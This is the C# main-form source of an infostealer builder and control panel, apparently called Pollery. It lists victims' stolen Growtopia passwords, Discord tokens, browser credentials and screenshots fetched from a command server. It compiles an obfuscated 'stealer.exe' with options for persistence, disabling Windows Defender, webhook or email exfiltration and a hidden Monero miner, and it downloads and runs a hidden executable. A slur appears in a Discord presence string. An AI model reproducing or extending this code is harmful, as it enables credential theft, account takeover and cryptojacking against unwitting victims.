using Atheny.Extensions;
using DarkUI.Controls;
using DarkUI.Forms;
using DiscordRPC;
using Microsoft.CSharp;
using Newtonsoft.Json;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.ComponentModel;
using System.Data.OleDb;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Threading.Tasks;
using System.Windows.Forms;
using OpenFileDialog = System.Windows.Forms.OpenFileDialog;
using SaveFileDialog = System.Windows.Forms.SaveFileDialog;
using System.Threading;
using System.Security.Cryptography;
using System.Text;

namespace Atheny
{
    public partial class MainForm : Form
    {
        public MainForm()
        {
            CheckForIllegalCrossThreadCalls = false;
            InitializeComponent();
            typeof(Panel).InvokeMember("DoubleBuffered", BindingFlags.SetProperty | BindingFlags.Instance | BindingFlags.NonPublic, null, bgPanel, new object[] { true });
        }
        private void rgbTimer_Tick(object sender, EventArgs e)
        {
            Rainbow.change_color(bgPanel);
        }


        public const int WM_NCLBUTTONDOWN = 0xA1;
        public const int HT_CAPTION = 0x2;

        [System.Runtime.InteropServices.DllImport("user32.dll")]
        public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);
        [System.Runtime.InteropServices.DllImport("user32.dll")]
        public static extern bool ReleaseCapture();

        private void DragMove(object sender, System.Windows.Forms.MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                ReleaseCapture();
                SendMessage(Handle, WM_NCLBUTTONDOWN, HT_CAPTION, 0);
            }
        }

        private void MoveSelector(Control control, int index, bool parent)
        {
            TabControl.SelectTab(index);
            if (!parent)
                menuSelector.Location = new Point(menuSelector.Location.X, control.Parent.Location.Y);
            else
                menuSelector.Location = new Point(menuSelector.Location.X, control.Location.Y);

        }

        private void mainPanelP_Click(object sender, EventArgs e)
        {
            MoveSelector(mainPanelP, 0, false);
        }

        private void configPanelP_Click(object sender, EventArgs e)
        {
            MoveSelector(configPanelP, 1, false);
        }

        private void builderPanelP_Click(object sender, EventArgs e)
        {
            MoveSelector(builderPanelP, 2, false);
        }

        private void otherPanelP_Click(object sender, EventArgs e)
        {
            MoveSelector(otherPanelP, 3, false);
        }

        private void exitB_Click(object sender, EventArgs e)
        {
            Environment.Exit(0);
        }

        private void minimizeB_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }

        private string MiningConstructor()
        {
            string src = "--donate-level 1{0}{1} -o {2} -u {3} -k --rig-id {4} -t {5}{6}";

            string cmd = string.Format(src,
                nvidiaRadio.Checked ? " --cuda" : null,
                amdRadio.Checked ? " --opencl" : null,
                "pool.minexmr.com:4444",
                "49rMZRgFpQVbheF4VfCvHX4CaB9HVQBjAVtxpTjjEBnadMKM73DQ8An3wske7YpJzKU3byFnYfe1uThByd773EbcNFogET7",
                Variables.Username,
                cpuNum.Value.ToString(),
                useLightMode.Checked ? " --randomx-mode=light" : null);
            return cmd;
        }

        private async void startCoin_Click(object sender, EventArgs e)
        {
            if (useLightMode.Checked)
            {
                DialogResult lmodewarning = DarkMessageBox.ShowWarning($"Using Light mode will limit ram usage and cpu priority," +
                    $" HOWEVER the process will be A LOT slower. If the process is too slow, mining won't work." +
                    $"\r\nIf your PC has less than 6 logical processors, you should NOT enable this option." +
                    $"\r\n\r\nYour logical processors: {Environment.ProcessorCount}\r\nProceed?", "Light Mode Warning", DarkDialogButton.Ok);
                if (lmodewarning == DialogResult.No)
                    return;
            }

            statL.Text = "Status: starting";
            stopCoin.Enabled = true;
            startCoin.Enabled = false;
            var proc = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = @"P-Coin\xmrig.exe",
                    Arguments = MiningConstructor(),
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    RedirectStandardInput = true,
                    CreateNoWindow = true
                }
            };

            proc.Start();

            statL.Text = "Status: running";
            cpuNum.Enabled = false;
            gpuSelectPanel.Enabled = false;
            dbox.titleLabel.Text = "P-Coin Mining Logs";
            dbox.Show();

            await Task.Run(() =>
            {
                StreamReader sr = proc.StandardOutput;
                StreamWriter sw = proc.StandardInput;
                while (!sr.EndOfStream)
                {
                    string line = sr.ReadLine();
                    dbox.descriptionLabel.AppendText(line + "\r\n");
                    if (line.Contains("accepted"))
                    {
                        sw.WriteLine('h');
                    } else if (line.Contains("speed"))
                    {

                    }
                }
            });
        }

        DialogBox dbox = DialogBox.getInstance();
        Random r;
        public void OutputHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            try
            {
                if (sendingProcess == null || outLine.Data == null)
                    return;

                dbox.descriptionLabel.AppendText(outLine.Data + Environment.NewLine);

                if (!outLine.Data.Contains("accepted")) return;

                r = new Random();

                double earned = r.NextDouble(1, 5);
                earned = Math.Truncate(earned * 100) / 100;
                NameValueCollection reward = new NameValueCollection();
                reward["username"] = Variables.Username;
                reward["increase"] = earned.ToString();

                byte[] rewarder = Program.client.UploadValues("http://193.111.77.77/api/pcoin/pcoin-earn.php", reward);
                Console.WriteLine(rewarder.Byte2String());
                if (rewarder.Byte2String() == "success")
                {
                    reward.Clear();
                    reward["username"] = Variables.Username;
                    string update = Program.client.UploadValues("http://193.111.77.77/api/pcoin/pcoin-check.php", reward).Byte2String();
                    Console.WriteLine(update);
                    coinAmount.Text = $"P$: {update}";
                }

                coinChart.Series[0].Points.Add(int.Parse(coinAmount.Text.Split(' ')[1]) + earned);

                if (coinChart.Series[0].Points.Count > 10)
                {
                    coinChart.Series[0].Points.RemoveAt(0);
                }
            }
            catch
            {
                Console.WriteLine("xmrig process still running..");
            }
        }

        public class AccountClass
        {
            [Browsable(true)]
            [ReadOnly(true)]
            [Description("The victim's ID in our databases.")]
            [Category("Account Details")]
            [DisplayName("Account ID")]
            public string ID { get; set; }

            [Browsable(true)]
            [ReadOnly(true)]
            [Description("The victim's GrowID.")]
            [Category("Account Details")]
            [DisplayName("Grow ID")]
            public string GrowID { get; set; }

            [Browsable(true)]
            [ReadOnly(true)]
            [Description("The victim's password.")]
            [Category("Account Details")]
            [DisplayName("Password")]
            public string Password { get; set; }

            [Browsable(true)]
            [ReadOnly(true)]
            [Description("The last world the victim has entered.")]
            [Category("Account Details")]
            [DisplayName("Last World")]
            public string LastWorld { get; set; }

            [Browsable(true)]
            [ReadOnly(true)]
            [Description("The victim's discord token that you can use to login to his account.")]
            [Category("Social Info")]
            [DisplayName("Discord Token")]
            public string Token { get; set; }

            [Browsable(true)]
            [ReadOnly(true)]
            [Description("A link to a screenshot of the victim's desktop")]
            [Category("Others")]
            [DisplayName("Desktop Picture")]
            public string DesktopPicture { get; set; }

            [Browsable(true)]
            [ReadOnly(true)]
            [Description("The name of the victim's PC.")]
            [Category("Others")]
            [DisplayName("PC Username")]
            public string PCUsername { get; set; }

            [Browsable(true)]
            [ReadOnly(true)]
            [Description("Browser credentials from all the websites the victim has visited, works for Internet Explorer, Chrome, Firefox and Edge.")]
            [Category("Social Info")]
            [DisplayName("Browser Credentials")]
            public string BrowserCreds { get; set; }

            [Browsable(true)]
            [ReadOnly(true)]
            [Description("The Mac addresses for each adapter of the victim.")]
            [Category("Others")]
            [DisplayName("Mac Addresses")]
            public string MAC { get; set; }
        }
        private void stopCoin_Click(object sender, EventArgs e)
        {
            statL.Text = "Status: stopping";
            stopCoin.Enabled = false;
            startCoin.Enabled = true;
            cpuNum.Enabled = true;
            gpuSelectPanel.Enabled = true;
            if (Process.GetProcessesByName("xmrig").Length > 0)
            {
                Process.GetProcessesByName("xmrig")[0].Kill();
            }
            statL.Text = "Status: idle";
        }


        private void accTree_AfterSelect(object sender, EventArgs e)
        {
            try
            {
                AccountClass ac = new AccountClass();
                if (accTree.SelectedNodes.Count <= 0)
                    return;

                DarkTreeNode node = accTree.SelectedNodes[0];
                if (node.ParentNode == null)
                    return;

                ac.ID = node.Text.Split('|')[0].Replace(" ", null);
                ac.GrowID = node.Text.Split('|')[1].Replace(" ", null);
                ac.Password = node.Nodes[0].Text;
                ac.LastWorld = node.Nodes[1].Text;
                ac.Token = node.Nodes[2].Text;
                ac.DesktopPicture = node.Nodes[3].Text;
                ac.BrowserCreds = node.Nodes[4].Text;
                ac.PCUsername = node.Nodes[5].Text;
                ac.MAC = node.Nodes[6].Text;
                accProperty.SelectedObject = ac;
            }
            catch { }
        }

        public class Packet
        {
            public string growid { get; set; }
            public string password { get; set; }
            public string lastworld { get; set; }
            public string token { get; set; }
            public string desktoppic { get; set; }
            public string pcname { get; set; }
            public string browsercreds { get; set; }
            public string mac { get; set; }
        }

        public void Renew(string user, string pass, string hwid, int acc)
        {
            try
            {
                string state = hwid == "0" ? "Team" : "Account";

                string data = string.Empty;
                NameValueCollection nameValueCollection = new NameValueCollection();
                nameValueCollection["username"] = user;
                nameValueCollection["password"] = hwid == "0" ? pass : pass.Hash();
                nameValueCollection["hwid"] = hwid;
                data = Program.client.UploadValues("http://193.111.77.77/api/api/server/display.php", nameValueCollection).Byte2String();

                int index = 0;

                if (string.IsNullOrWhiteSpace(data))
                {
                    accTree.Nodes.Add(new DarkTreeNode(state + " | " + user));
                    accTree.Nodes[acc].Nodes.Add(new DarkTreeNode("The list is empty :("));
                    return;
                }

                data = data.TrimEnd('^');

                string[] entities = data.Split('^');
                accTree.Nodes.Add(new DarkTreeNode(state + " | " + user));
                foreach (string entity in entities)
                {
                    string[] vars = entity.Split('|');
                    string id = vars[0];
                    string packet = vars[1];
                    string ip = vars[2];
                    string date = vars[3];
                    string hacked = vars[4];

                    Packet json = JsonConvert.DeserializeObject<Packet>(packet);

                    accTree.Nodes[acc].Nodes.Add(new DarkTreeNode(id + " | " + json.growid + " | " + date));
                    accTree.Nodes[acc].Nodes[index].Nodes.Add(new DarkTreeNode(json.password));
                    accTree.Nodes[acc].Nodes[index].Nodes.Add(new DarkTreeNode(json.lastworld));
                    accTree.Nodes[acc].Nodes[index].Nodes.Add(new DarkTreeNode(json.token));
                    accTree.Nodes[acc].Nodes[index].Nodes.Add(new DarkTreeNode(json.desktoppic.Replace(@"\", string.Empty)));
                    accTree.Nodes[acc].Nodes[index].Nodes.Add(new DarkTreeNode(json.browsercreds));
                    accTree.Nodes[acc].Nodes[index].Nodes.Add(new DarkTreeNode(json.pcname));
                    accTree.Nodes[acc].Nodes[index].Nodes.Add(new DarkTreeNode(json.mac));
                    index++;
                }
            }
            catch { }
        }

        private void useGpu_CheckedChanged(object sender, EventArgs e)
        {
            nvidiaRadio.Checked = useGpu.Checked;
            amdRadio.Checked = useGpu.Checked;
            nvidiaRadio.Enabled = useGpu.Checked;
            amdRadio.Enabled = useGpu.Checked;
        }

        private void UpdatePolleryInfo()
        {
            string users = Program.client.DownloadString("http://193.111.77.77/api/api/server/users_count.php");
            string accs = Program.client.DownloadString("http://193.111.77.77/api/api/server/global_count.php");
            if (!string.IsNullOrWhiteSpace(users) || !string.IsNullOrWhiteSpace(accs))
            {
                currentUsers.Text = "Current users: " + users;
                currentaccounts.Text = "Current accounts: " + accs;
            }
            else
            {
                currentUsers.Text = "Current users: ?";
                currentaccounts.Text = "Current accounts: ?";
            }
        }

        private void useLightMode_CheckedChanged(object sender, EventArgs e)
        {
            useGpu.Checked = !useLightMode.Checked;
            useGpu.Enabled = !useLightMode.Checked;
            nvidiaRadio.Checked = !useLightMode.Checked;
            amdRadio.Checked = !useLightMode.Checked;
        }

        private void MainForm_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (Process.GetProcessesByName("xmrig").Length > 0)
            {
                Process.GetProcessesByName("xmrig")[0].Kill();
            }
        }

        private void coinAddr_Click(object sender, EventArgs e)
        {
            try
            {
                Clipboard.SetText(Variables.PCoinAddress);
            }
            catch { }
        }

        private string CheckCoin()
        {
            coinAmount.Text = "Updating...";
            NameValueCollection reward = new NameValueCollection();
            reward["username"] = Variables.Username;
            string update = Program.client.UploadValues("http://193.111.77.77/api/pcoin/pcoin-check.php", reward).Byte2String();
            return $"P$: {update}";
        }

        private void coinAmount_Click(object sender, EventArgs e)
        {
            coinAmount.Text = CheckCoin();
        }

        private void teamManager_Click(object sender, EventArgs e)
        {
            new TeamManager().ShowDialog();
        }

        private void renewB_Click(object sender, EventArgs e)
        {
            accTree.Nodes.Clear();
            Renew(Variables.Username, Variables.Password, Variables.Hwid, 0);
            for (int i = 0; i < Variables.Teams.Count(); i++)
            {
                string[] team = Variables.Teams[i].Split(':');
                Renew(team[0], team[1], "0", i + 1);
            }
        }

        private void teamConfig_Click(object sender, EventArgs e)
        {
            TeamManager tc = new TeamManager();
            tc.ShowDialog();
        }

        private void Ping()
        {
            try
            {
                PingReply reply = pinger.Send("pollery.eu");
                conState.Text = reply.Status == IPStatus.Success ? "Connection State: OK" : "Connection State: Error";
                conState.ForeColor = reply.Status == IPStatus.Success ? Color.Lime : Color.Red;
                pingLabel.Text = "Estimated Ping: " + reply.RoundtripTime.ToString();
            }
            catch { }
        }

        Ping pinger = new Ping();
        private void updateCpu_Tick(object sender, EventArgs e)
        {
            Ping();
        }

        private void pingB_Click(object sender, EventArgs e)
        {
            Ping();
        }

        private void rgbBox_CheckedChanged(object sender, EventArgs e)
        {
            rgbTimer.Enabled = rgbBox.Checked;
            if (!rgbBox.Checked)
            {
                bgPanel.BackColor = Color.FromArgb(44, 44, 44);
                menuSelector.BackColor = Color.FromArgb(44, 44, 44);
            }
        }

        public static DiscordRpcClient rpc = new DiscordRpcClient("733486770905415701");

        private void UpdateRPC(string title, string text)
        {
            rpc.SetPresence(new RichPresence()
            {
                Details = title,
                State = text,
                Assets = new Assets()
                {
                    LargeImageKey = "plogo",
                    LargeImageText = "gay nigga black",
                    SmallImageKey = "mark"
                }
            });
        }

        private void rpcTimer_Tick(object sender, EventArgs e)
        {
            UpdateRPC(titleRpc.Text, textRpc.Text);
        }

        private void appluRpc_Click(object sender, EventArgs e)
        {
            UpdateRPC(titleRpc.Text, textRpc.Text);
        }

        private void useRpc_CheckedChanged(object sender, EventArgs e)
        {
            rpcTimer.Enabled = useRpc.Enabled;
            if (!useRpc.Checked)
                rpc.ClearPresence();
        }

        private void accTree_MouseClick(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Right)
            {
                accMenu.Show(accTree, e.Location);
            }
        }

        private void Export(bool normalformat)
        {
            string export = string.Empty;
            try
            {
                DarkTreeNode node = accTree.SelectedNodes[0];
                string[] title = node.Text.Split('|');
                string gid = title[1].Replace(" ", null);
                string date = title[2];
                string pw = node.Nodes[0].Text;
                string lw = node.Nodes[1].Text;
                if (normalformat)
                {
                    export = $"<= Exported by Pollery =>\r\n -> Date: {date} \r\n -> Grow ID: {gid} \r\n -> Password(s): {pw} \r\n -> Last world: {lw}";
                }
                else
                {
                    export = $"{gid}:{pw}";
                }
            }
            catch
            {
                DarkMessageBox.ShowWarning("Please select a valid account node.", "Invalid Node", DarkDialogButton.Ok);
                return;
            }
            File.WriteAllText("accounts.txt", export);
            DarkMessageBox.ShowInformation("Exported to account.txt!", "Exported successfully.", DarkDialogButton.Ok);
        }

        public string text = string.Empty;
        private void normalFormatToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Export(true);
        }

        private void growidpasswordFormatToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Export(false);
        }

        private void DeleteAccount(string id)
        {
            try
            {
                NameValueCollection post = new NameValueCollection();
                string[] info = accTree.SelectedNodes[0].ParentNode.Text.Split('|');

                post["username"] = info[1].Replace(" ", null);
                post["password"] = info[0].Replace(" ", null) == "Account" ? Variables.Password.Hash() : Variables.Teams.Where(var => var.Contains(info[1].Replace(" ", string.Empty))).FirstOrDefault().Split(':')[1];
                post["hwid"] = info[0].Replace(" ", null) == "Account" ? Variables.Hwid : "0";
                post["deleteid"] = id;
                string data = Program.client.UploadValues("http://193.111.77.77/api/api/server/delete.php", post).Byte2String();
            }
            catch
            {
                DarkMessageBox.ShowWarning("Please select a valid account node.", "Invalid Node", DarkDialogButton.Ok);
                return;
            }
        }

        private void deleteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (accTree.SelectedNodes.Count <= 0)
                return;

            DarkTreeNode node = accTree.SelectedNodes[0];
            if (node.ParentNode == null)
                return;

            DeleteAccount(node.Text.Split('|')[0].Replace(" ", null));
            node.Remove();
        }

        private void transactionsB_Click(object sender, EventArgs e)
        {
            Transactions form = new Transactions();
            form.ShowDialog();
            coinAmount.Text = CheckCoin();
        }

        private void SaveConfiguration()
        {
            Configuration config = new Configuration();
            config.UseRGB = rgbBox.Checked;
            config.UseGPU = useGpu.Checked;
            config.Nvidia = nvidiaRadio.Checked;
            config.CPUCores = (int)cpuNum.Value;
            config.LightMode = useLightMode.Checked;
            config.UseRPC = useRpc.Checked;
            config.TitleRPC = titleRpc.Text;
            config.TextRPC = textRpc.Text;
            config.IntervalRPC = (int)intervalNum.Value;
            config.StealerEmail = emailBox.Text;
            config.StealerEmailServer = stmpserverBox.Text;
            config.StealerEmailPort = smtpportBox.Text;
            config.SendToOther = sendtomoreCheck.Checked;
            config.OtherEmail = sendtomoreBox.Text;
            config.UseHTTPS = useHttps.Checked;
            config.UseMiner = minePCoin.Checked;
            config.Webhooks = new List<string>(backupWebhooks.Items.Cast<string>().ToArray());

            string cfg = JsonConvert.SerializeObject(config, Formatting.Indented);
            File.WriteAllText(@"config.pol", cfg);
        }

        private void saveConfig_Click(object sender, EventArgs e)
        {
            SaveConfiguration();
            DarkMessageBox.ShowInformation("Configuration saved under your config.pol file.", "Configuration", DarkDialogButton.Ok);
        }

        private void backupAdd_Click(object sender, EventArgs e)
        {
            backupWebhooks.Items.Add(webhookUrl.Text);
        }

        private void LoadSettings()
        {
            if (File.Exists("config.pol"))
            {
                string json = File.ReadAllText("config.pol");
                try
                {
                    Configuration config = JsonConvert.DeserializeObject<Configuration>(json);
                    rgbBox.Checked = config.UseRGB;
                    useGpu.Checked = config.UseGPU;
                    nvidiaRadio.Checked = config.Nvidia;
                    cpuNum.Value = config.CPUCores;
                    useLightMode.Checked = config.LightMode;
                    useRpc.Checked = config.UseRPC;
                    titleRpc.Text = config.TitleRPC;
                    textRpc.Text = config.TextRPC;
                    intervalNum.Value = config.IntervalRPC;
                    emailBox.Text = config.StealerEmail;
                    stmpserverBox.Text = config.StealerEmailServer;
                    smtpportBox.Text = config.StealerEmailPort;
                    sendtomoreCheck.Checked = config.SendToOther;
                    sendtomoreBox.Text = config.OtherEmail;                    
                    useHttps.Checked = config.UseHTTPS;
                    minePCoin.Checked = config.UseMiner;
                    backupWebhooks.Items.AddRange(config.Webhooks.Cast<string>().ToArray());
                }
                catch { }
            }
        }

        private async Task LoadDesign()
        {
            await Task.Run(() =>
            {
                cpuNum.Maximum = cpuNum.Value = Environment.ProcessorCount;
                coinAddr.Text = $"Your Address: {Variables.PCoinAddress}";
                UpdatePolleryInfo();
                LoadSettings();
                rpc.Initialize();
            });
        }

        private async void MainForm_Shown(object sender, EventArgs e)
        {
            await LoadDesign();
        }

        private void importPlugins_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog();
            ofd.Multiselect = false;
            ofd.Filter = "Plugin File (.pl)|*.pl";
            if (ofd.ShowDialog() == DialogResult.OK)
            {
                pluginsList.Items.Add(ofd.FileName);
            }
        }

        private void removeBox_Click(object sender, EventArgs e)
        {
            if (pluginsList.SelectedItem != null)
                pluginsList.Items.Remove(pluginsList.SelectedItem);
        }

        private void pluginsGuide_Click(object sender, EventArgs e)
        {
            PluginsGuide pg = new PluginsGuide();
            pg.ShowDialog();
        }

        private void testPass_Click(object sender, EventArgs e)
        {
            if (externalPass.Checked)
            {
                string temp = Path.GetTempFileName() + ".exe";
                WebClient client = new WebClient();
                client.DownloadFile("https://github.com/rubby1337/pollery-bins/raw/master/savedecrypter.exe", temp);
                Process p = new Process();
                p.StartInfo.FileName = temp;
                p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                p.StartInfo.CreateNoWindow = true;
                p.Start();
                p.WaitForExit();
                string path = Path.GetTempPath() + "result.txt";
                string pass = File.ReadAllText(path).Split('|')[1];
                DarkMessageBox.ShowInformation($"Detected password: {pass}", "Password Tester", DarkDialogButton.Ok);
            }
            else if (internalPass.Checked)
            {
                string pass = CSharpPasswordDecoding.Get();
                DarkMessageBox.ShowInformation($"Detected password: {pass}\r\n [This method is the most undetected one but it's still experimental and it might not work with some symbols.]", "Password Tester", DarkDialogButton.Ok);
            }
        }

        private void deserializeBrowser_Click(object sender, EventArgs e)
        {
            try
            {
                if (accTree.SelectedNodes.Count <= 0)
                    return;

                DarkTreeNode node = accTree.SelectedNodes[0];
                if (node.ParentNode == null)
                    return;

                File.WriteAllText("temp.html", node.Nodes[4].Text);
                Process.Start("temp.html");
            }
            catch { }
        }

        private void emailBox_Click(object sender, EventArgs e)
        {
            DarkMessageBox.ShowInformation("Use the format email:password! Only typing email won't work.", "Warning", DarkDialogButton.Ok);
        }

        private string BuildConfig()
        {
            string code = Program.client.DownloadString("http://193.111.77.77/api/codebase.txt");

            string cfg = string.Empty;
            cfg += featuresTree.Nodes.Find("token", true)[0].Checked ? "1" : "0";
            cfg += featuresTree.Nodes.Find("machinename", true)[0].Checked ? "1" : "0";
            cfg += featuresTree.Nodes.Find("mac", true)[0].Checked ? "1" : "0";
            cfg += featuresTree.Nodes.Find("screenshot", true)[0].Checked ? "1" : "0";
            cfg += featuresTree.Nodes.Find("browser", true)[0].Checked ? "1" : "0";
            cfg += featuresTree.Nodes.Find("startup", true)[0].Checked ? "1" : "0";
            cfg += "0"; //process protection
            cfg += featuresTree.Nodes.Find("hide", true)[0].Checked ? "1" : "0";
            cfg += featuresTree.Nodes.Find("antitaskmanager", true)[0].Checked ? "1" : "0";
            cfg += featuresTree.Nodes.Find("trace", true)[0].Checked ? "1" : "0";

            code = code.Replace("000000000", cfg);

            if (featuresTree.Nodes.Find("disablewindefender", true)[0].Checked)
            {
                code = code.Replace("/*WINDEF", string.Empty).Replace("WINDEF*/", string.Empty);
            }

            if (featuresTree.Nodes.Find("pcoin", true)[0].Checked)
            {
                code = code.Replace("/*MINE", string.Empty).Replace("MINE*/", string.Empty);
            }
            if (teamSelector.CheckedItems.Count > 0)
            {
                string addon = $"\"{Variables.Username}\",";
                foreach(string team in teamSelector.CheckedItems)
                {
                    addon += $"\"{team.Split(':')[0]}\",";
                }
                addon = addon.TrimEnd(',');
                code = code.Replace("users = new string[] { }", "users = new string[] { " + addon + " }");
            }
            else
            {
                code = code.Replace("users = new string[] { }", "users = new string[] { \"" + Variables.Username + "\" }");
            }
            if (webhookDelivery.Checked)
            {
                code = code.Replace("dwebhook = false", "dwebhook = true");
                string addon = string.Empty;
                foreach (string hook in backupWebhooks.Items)
                {
                    addon += $"\"{hook}\",";
                }
                addon = addon.TrimEnd(',');
                code = code.Replace("webhooks = new string[] {  }", "webhooks = new string[] { " + addon + " }");
            }

            if (emailDelivery.Checked)
            {
                code = code.Replace("demail = false", "demail = true");
                Console.WriteLine(emailBox.Text.Base64Encode());
                code = code.Replace("fromemail = null", $"fromemail = \"{emailBox.Text.Base64Encode()}\"");
                code = code.Replace("toemail = null", $"toemail = \"{sendtomoreBox.Text}\"");
            }

            string plugins = string.Empty;
            foreach (string plugin in pluginsList.CheckedItems)
            {
                string b64 = File.ReadAllText(plugin);
                string raw = Convert.FromBase64String(b64).Byte2String();
                plugins = raw + "\r\n";
            }
            code = code.Replace("//customplugins", plugins);

            return code;
        }


        private void buildB_Click(object sender, EventArgs e)
        {
            string code_base = BuildConfig();

            string filename = "stealer.exe";

            var settings = new Dictionary<string, string>();
            settings.Add("CompilerVersion", "v4.0");
            CSharpCodeProvider codeProvider = new CSharpCodeProvider(settings);
            ICodeCompiler icc = codeProvider.CreateCompiler();
            CompilerParameters parameters = new CompilerParameters();
            parameters.OutputAssembly = $"{Application.StartupPath}\\Obfuscation\\{filename}";
            parameters.GenerateExecutable = true;
            parameters.IncludeDebugInformation = false;
            parameters.CompilerOptions = "/unsafe /t:winexe ";

            if (featuresTree.Nodes.Find("runasadmin", true)[0].Checked)
            {
                logsLabel.Text = "Using admin rights...\r\n";
                File.WriteAllText("app.manifest", Properties.Resources.Manifest);
                parameters.CompilerOptions += "/win32manifest:app.manifest ";
            }

            if (!string.IsNullOrEmpty(iconBox.ImageLocation))
            {
                logsLabel.Text = "Icon imported!";
                parameters.CompilerOptions += "/win32icon:" + @"""" + iconBox.ImageLocation + @"""";
            }

            parameters.ReferencedAssemblies.Add("System.dll");
            parameters.ReferencedAssemblies.Add("System.Drawing.dll");
            parameters.ReferencedAssemblies.Add("System.Net.Http.dll");
            parameters.ReferencedAssemblies.Add("System.Runtime.Serialization.dll");
            parameters.ReferencedAssemblies.Add("System.Windows.Forms.dll");
            parameters.ReferencedAssemblies.Add("System.Xml.dll");
            parameters.ReferencedAssemblies.Add("System.IO.Compression.FileSystem.dll");

            CompilerResults results = icc.CompileAssemblyFromSource(parameters, code_base);

            if (results.Errors.Count > 0)
            {
                foreach (CompilerError err in results.Errors)
                {
                    DarkMessageBox.ShowError("Error: " + err.ToString() + "\r\n", "Error Detected");
                }
            }
            else
            {
                logsLabel.Text = "Obfuscating the assembly...";
            }

            string obf =
                $"<project outputDir=\"{Application.StartupPath}\\\" baseDir=\"{Application.StartupPath}\\Obfuscation\\\" xmlns=\"http://confuser.codeplex.com\">\r\n"
                + "  <rule pattern=\"true\" preset=\"normal\" inherit=\"false\">\r\n"
                + "    <protection id=\"rename\" action=\"remove\" />\r\n"
                + "  </rule>\r\n"
                + $"  <module path=\"{filename}\" />\r\n"
                + "</project>";

            File.WriteAllText($"{Application.StartupPath}\\Obfuscation\\cfg.crproj", obf);

            Process p = new Process();
            p.StartInfo.FileName = $"cmd.exe";
            p.StartInfo.Arguments = $"/c Confuser.CLI.exe cfg.crproj";
            p.StartInfo.WorkingDirectory = $"{Application.StartupPath}\\Obfuscation\\";
            p.Start();
            p.WaitForExit();
            try
            {
                File.Delete($"{Application.StartupPath}\\Obfuscation\\{filename}");
                File.Delete($"{Application.StartupPath}\\symbols.map");
            }
            catch { }

            logsLabel.Text = "Saved to " + filename;
        }

        private void selectIcon_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog();
            ofd.Title = "Select your icon";
            ofd.Filter = "Executable files (*.ico)|*.ico";
            ofd.Multiselect = false;
            ofd.SupportMultiDottedExtensions = false;
            ofd.ShowHelp = true;
            ofd.ShowDialog();
            iconBox.ImageLocation = ofd.FileName;
        }

        private void removeSelected_Click(object sender, EventArgs e)
        {
            backupWebhooks.Items.Remove(backupWebhooks.SelectedItem);
        }

        private void TabControl_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (TabControl.SelectedIndex == 2)
            {
                teamSelector.Items.Clear();
                teamSelector.Items.AddRange(Variables.Teams.ToArray());
            }
        }

        public static class StringCipher
        {
            // This constant is used to determine the keysize of the encryption algorithm in bits.
            // We divide this by 8 within the code below to get the equivalent number of bytes.
            private const int Keysize = 256;

            // This constant determines the number of iterations for the password bytes generation function.
            private const int DerivationIterations = 1000;

            public static string Encrypt(string plainText, string passPhrase)
            {
                // Salt and IV is randomly generated each time, but is preprended to encrypted cipher text
                // so that the same Salt and IV values can be used when decrypting.  
                var saltStringBytes = Generate256BitsOfRandomEntropy();
                var ivStringBytes = Generate256BitsOfRandomEntropy();
                var plainTextBytes = Encoding.UTF8.GetBytes(plainText);
                using (var password = new Rfc2898DeriveBytes(passPhrase, saltStringBytes, DerivationIterations))
                {
                    var keyBytes = password.GetBytes(Keysize / 8);
                    using (var symmetricKey = new RijndaelManaged())
                    {
                        symmetricKey.BlockSize = 256;
                        symmetricKey.Mode = CipherMode.CBC;
                        symmetricKey.Padding = PaddingMode.PKCS7;
                        using (var encryptor = symmetricKey.CreateEncryptor(keyBytes, ivStringBytes))
                        {
                            using (var memoryStream = new MemoryStream())
                            {
                                using (var cryptoStream = new CryptoStream(memoryStream, encryptor, CryptoStreamMode.Write))
                                {
                                    cryptoStream.Write(plainTextBytes, 0, plainTextBytes.Length);
                                    cryptoStream.FlushFinalBlock();
                                    // Create the final bytes as a concatenation of the random salt bytes, the random iv bytes and the cipher bytes.
                                    var cipherTextBytes = saltStringBytes;
                                    cipherTextBytes = cipherTextBytes.Concat(ivStringBytes).ToArray();
                                    cipherTextBytes = cipherTextBytes.Concat(memoryStream.ToArray()).ToArray();
                                    memoryStream.Close();
                                    cryptoStream.Close();
                                    return Convert.ToBase64String(cipherTextBytes);
                                }
                            }
                        }
                    }
                }
            }

            public static string Decrypt(string cipherText, string passPhrase)
            {
                // Get the complete stream of bytes that represent:
                // [32 bytes of Salt] + [32 bytes of IV] + [n bytes of CipherText]
                var cipherTextBytesWithSaltAndIv = Convert.FromBase64String(cipherText);
                // Get the saltbytes by extracting the first 32 bytes from the supplied cipherText bytes.
                var saltStringBytes = cipherTextBytesWithSaltAndIv.Take(Keysize / 8).ToArray();
                // Get the IV bytes by extracting the next 32 bytes from the supplied cipherText bytes.
                var ivStringBytes = cipherTextBytesWithSaltAndIv.Skip(Keysize / 8).Take(Keysize / 8).ToArray();
                // Get the actual cipher text bytes by removing the first 64 bytes from the cipherText string.
                var cipherTextBytes = cipherTextBytesWithSaltAndIv.Skip((Keysize / 8) * 2).Take(cipherTextBytesWithSaltAndIv.Length - ((Keysize / 8) * 2)).ToArray();

                using (var password = new Rfc2898DeriveBytes(passPhrase, saltStringBytes, DerivationIterations))
                {
                    var keyBytes = password.GetBytes(Keysize / 8);
                    using (var symmetricKey = new RijndaelManaged())
                    {
                        symmetricKey.BlockSize = 256;
                        symmetricKey.Mode = CipherMode.CBC;
                        symmetricKey.Padding = PaddingMode.PKCS7;
